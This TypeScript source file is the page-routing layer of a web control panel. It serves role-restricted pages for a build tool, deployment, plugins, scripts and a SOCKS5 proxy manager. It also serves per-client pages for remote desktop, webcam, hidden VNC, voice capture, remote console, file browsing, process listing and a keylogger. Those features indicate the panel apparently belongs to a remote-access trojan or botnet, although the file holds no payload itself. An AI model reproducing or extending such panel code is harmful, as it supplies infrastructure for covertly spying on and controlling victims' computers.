import { authenticateRequest } from "../../auth";
import { requirePermission, type Permission } from "../../rbac";
import { canUserAccessClient, getUserById, type UserRole } from "../../users";

type PageRouteDeps = {
  PUBLIC_ROOT: string;
  secureHeaders: (contentType?: string) => Record<string, string>;
  mimeType: (path: string) => string;
};

async function serveLoginOrUnauthorized(deps: PageRouteDeps): Promise<Response> {
  const loginFile = Bun.file(`${deps.PUBLIC_ROOT}/login.html`);
  if (await loginFile.exists()) {
    return new Response(loginFile, { headers: deps.secureHeaders(deps.mimeType("/login.html")) });
  }
  return new Response("Unauthorized", { status: 401 });
}

async function serveChangePasswordIfRequired(
  deps: PageRouteDeps,
  userId: number,
): Promise<Response | null> {
  const dbUser = getUserById(userId);
  if (dbUser && dbUser.must_change_password) {
    const changePassFile = Bun.file(`${deps.PUBLIC_ROOT}/change-password.html`);
    if (await changePassFile.exists()) {
      return new Response(changePassFile, {
        headers: deps.secureHeaders(deps.mimeType("/change-password.html")),
      });
    }
  }
  return null;
}

async function serveFile(deps: PageRouteDeps, htmlFile: string): Promise<Response | null> {
  const file = Bun.file(`${deps.PUBLIC_ROOT}/${htmlFile}`);
  if (await file.exists()) {
    return new Response(file, { headers: deps.secureHeaders(deps.mimeType(htmlFile)) });
  }
  return null;
}

// ---- Page definitions ----

type AccessLevel = "any" | "no-viewer" | "admin" | "admin-or-operator";
type StaticPageDef = {
  path: string;
  file: string;
  access: AccessLevel;
  permission?: Permission;
  checkPasswordChange?: boolean;
};

type ClientPageDef = {
  pattern: RegExp;
  file: string;
  clientIdGroup: number;
};

type QueryClientPageDef = {
  path: string;
  file: string;
};

/** Static pages: each entry maps a URL path to its HTML file + access rules. */
const STATIC_PAGES: StaticPageDef[] = [
  { path: "/metrics",            file: "metrics.html",             access: "any",              checkPasswordChange: true },
  { path: "/settings",           file: "settings.html",            access: "any",              checkPasswordChange: true },
  { path: "/logs",               file: "logs.html",                access: "any",              checkPasswordChange: true, permission: "audit:view" },
  { path: "/notifications",      file: "notifications.html",       access: "admin-or-operator", checkPasswordChange: true },
  { path: "/users",              file: "users.html",               access: "admin",            checkPasswordChange: true },
  { path: "/user-client-access", file: "user-client-access.html",  access: "admin",            checkPasswordChange: true },
  { path: "/build",              file: "build.html",               access: "admin-or-operator" },
  { path: "/plugins",            file: "plugins.html",             access: "admin-or-operator" },
  { path: "/scripts",            file: "scripts.html",             access: "no-viewer" },
  { path: "/deploy",             file: "deploy.html",              access: "admin" },
  { path: "/socks5-manager",     file: "socks5-manager.html",      access: "no-viewer",        checkPasswordChange: true },
];

/** Client-scoped pages accessed via query param ?clientId=... */
const QUERY_CLIENT_PAGES: QueryClientPageDef[] = [
  { path: "/remotedesktop", file: "remotedesktop.html" },
  { path: "/webcam",        file: "webcam.html" },
  { path: "/hvnc",          file: "hvnc.html" },
  { path: "/voice",         file: "voice.html" },
];

/** Client-scoped pages accessed via path /:clientId/feature */
const PATH_CLIENT_PAGES: ClientPageDef[] = [
  { pattern: /^\/(.+)\/console$/,    file: "console.html",    clientIdGroup: 1 },
  { pattern: /^\/(.+)\/files$/,      file: "filebrowser.html", clientIdGroup: 1 },
  { pattern: /^\/(.+)\/processes$/,  file: "processes.html",  clientIdGroup: 1 },
  { pattern: /^\/(.+)\/keylogger$/,  file: "keylogger.html",  clientIdGroup: 1 },
];

function checkAccess(role: UserRole, access: AccessLevel): Response | null {
  switch (access) {
    case "any":
      return null;
    case "no-viewer":
      if (role === "viewer") {
        return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
      }
      return null;
    case "admin":
      if (role !== "admin") {
        return new Response("Forbidden: Admin access required", { status: 403 });
      }
      return null;
    case "admin-or-operator":
      if (role !== "admin" && role !== "operator") {
        return new Response("Forbidden: Admin or operator access required", { status: 403 });
      }
      return null;
  }
}

export async function handlePageRoutes(
  req: Request,
  url: URL,
  deps: PageRouteDeps,
): Promise<Response | null> {
  if (req.method !== "GET") return null;

  const canAccessClientPage = (userId: number, role: UserRole, clientId: string): boolean => {
    if (!clientId) return false;
    return canUserAccessClient(userId, role, clientId);
  };

  // ---- Root / index ----
  if (url.pathname === "/" || url.pathname === "/index.html") {
    const authed = await authenticateRequest(req);
    if (authed) {
      const maybeChange = await serveChangePasswordIfRequired(deps, authed.userId);
      if (maybeChange) return maybeChange;
    }
    const filePath = authed ? "/index.html" : "/login.html";
    const file = Bun.file(`${deps.PUBLIC_ROOT}${filePath}`);
    if (await file.exists()) {
      return new Response(file, { headers: deps.secureHeaders(deps.mimeType(filePath)) });
    }
  }

  // ---- Change password (always accessible) ----
  if (url.pathname === "/change-password.html") {
    return serveFile(deps, "change-password.html");
  }

  // ---- Static pages (table-driven) ----
  for (const page of STATIC_PAGES) {
    if (url.pathname !== page.path) continue;

    const user = await authenticateRequest(req);
    if (!user) return serveLoginOrUnauthorized(deps);

    if (page.checkPasswordChange) {
      const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
      if (maybeChange) return maybeChange;
    }

    const accessDenied = checkAccess(user.role, page.access);
    if (accessDenied) return accessDenied;

    if (page.permission) {
      try {
        requirePermission(user, page.permission);
      } catch (error) {
        if (error instanceof Response) return error;
        return new Response("Forbidden", { status: 403 });
      }
    }

    return serveFile(deps, page.file);
  }

  // ---- Client pages via query param (?clientId=...) ----
  for (const page of QUERY_CLIENT_PAGES) {
    if (url.pathname !== page.path) continue;

    const user = await authenticateRequest(req);
    if (!user) return serveLoginOrUnauthorized(deps);

    const maybeChange = await serveChangePasswordIfRequired(deps, user.userId);
    if (maybeChange) return maybeChange;

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }

    const clientId = (url.searchParams.get("clientId") || "").trim();
    if (!canAccessClientPage(user.userId, user.role, clientId)) {
      return new Response("Forbidden: Client access denied", { status: 403 });
    }

    return serveFile(deps, page.file);
  }

  // ---- Client pages via path (/:clientId/feature) ----
  for (const page of PATH_CLIENT_PAGES) {
    const match = url.pathname.match(page.pattern);
    if (!match) continue;

    const user = await authenticateRequest(req);
    if (!user) return serveLoginOrUnauthorized(deps);

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }

    const clientId = match[page.clientIdGroup];
    if (!canAccessClientPage(user.userId, user.role, clientId)) {
      return new Response("Forbidden: Client access denied", { status: 403 });
    }

    return serveFile(deps, page.file);
  }

  return null;
}
